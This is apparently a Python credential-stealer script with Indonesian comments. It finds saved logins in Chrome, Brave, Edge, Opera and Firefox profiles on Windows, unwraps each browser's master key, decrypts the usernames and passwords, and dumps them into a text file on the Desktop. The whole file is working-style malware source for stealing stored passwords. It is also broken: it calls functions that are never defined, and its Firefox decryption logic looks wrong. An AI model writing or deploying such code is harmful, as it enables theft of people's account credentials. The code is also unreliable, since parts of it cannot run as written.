import os
import json
import sqlite3
import shutil
from base64 import b64decode
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from hashlib import sha1
from hmac import new as hmac
from win32crypt import CryptUnprotectData

desktop = os.path.join(os.getenv("USERPROFILE"), "Desktop")
output_file = os.path.join(desktop, "BrowserData.txt")
firefox_dir = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')

browsers = {
    'chrome': os.getenv('LOCALAPPDATA') + '\\Google\\Chrome\\User Data',
    'brave': os.getenv('LOCALAPPDATA') + '\\BraveSoftware\\Brave-Browser\\User Data',
    'msedge': os.getenv('LOCALAPPDATA') + '\\Microsoft\\Edge\\User Data',
    'opera': os.getenv('APPDATA') + '\\Opera Software\\Opera Stable'
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    }
}

def get_master_key_chromium(path):
    """Mengambil Master Key untuk browser berbasis Chromium"""
    local_state_path = os.path.join(path, "Local State")
    if not os.path.exists(local_state_path):
        return None

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]  # Hilangkan prefix "DPAPI"
    master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key
    
def get_firefox_master_key(profile):
    """Ambil Master Key dari Firefox"""
    key_db = os.path.join(firefox_dir, profile, 'key4.db')
    if not os.path.exists(key_db):
        return None

    conn = sqlite3.connect(key_db)
    cursor = conn.cursor()
    cursor.execute("SELECT item1, item2 FROM metadata WHERE id = 'password'")
    global_salt, encrypted_key = cursor.fetchone()
    cursor.close()
    conn.close()

    master_password = b""  # Master password default (kosong)
    hashed_password = sha1(global_salt + master_password).digest()
    final_key = hmac(hashed_password, b"password-check", sha1).digest()

    if not final_key[:2] == b"\x00\x00":
        raise ValueError("Master password tidak valid untuk profil ini.")

    iv = encrypted_key[:16]
    cipher = Cipher(algorithms.AES(final_key[2:]), modes.CBC(iv))
    decryptor = cipher.decryptor()
    master_key = decryptor.update(encrypted_key[16:]) + decryptor.finalize()
    return master_key.strip()


def decrypt_password_firefox(ciphertext, master_key):
    iv = ciphertext[:16]
    data = ciphertext[16:]
    cipher = Cipher(algorithms.AES(master_key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    return decryptor.update(data).decode()


def get_firefox_logins(profile, master_key):
    """Ambil Data Login dari Firefox"""
    logins_path = os.path.join(firefox_dir, profile, 'logins.json')
    if not os.path.exists(logins_path):
        return "Logins file tidak ditemukan.\n"

    with open(logins_path, 'r') as f:
        logins = json.load(f)

    result = []
    for login in logins["logins"]:
        hostname = login["hostname"]
        encrypted_username = b64decode(login["encryptedUsername"])
        encrypted_password = b64decode(login["encryptedPassword"])
        username = decrypt_firefox_password(encrypted_username, master_key)
        password = decrypt_firefox_password(encrypted_password, master_key)
        result.append(f"URL: {hostname}\nUsername: {username}\nPassword: {password}\n\n")
    return "".join(result)


if __name__ == '__main__':
    if os.path.exists(output_file):
        os.remove(output_file)

    # Chromium Browsers
    for browser_name, browser_path in browsers.items():
        if os.path.exists(browser_path):
            print(f"[✔] Memproses {browser_name}...")
            master_key = get_master_key_chromium(browser_path)
            data = get_data_chromium(browser_path, 'Default', master_key, data_queries['login_data'])
            save_to_file(f"\n--- {browser_name.capitalize()} ---\n{data}")

    # Firefox Browsers
    profiles = [p for p in os.listdir(firefox_dir) if p.endswith('.default-release')]
    for profile in profiles:
        print(f"[✔] Memproses Firefox profile: {profile}...")
        master_key = get_firefox_master_key(profile)
        if master_key:
            data = get_firefox_logins(profile, master_key)
            save_to_file(f"\n--- Firefox ({profile}) ---\n{data}")
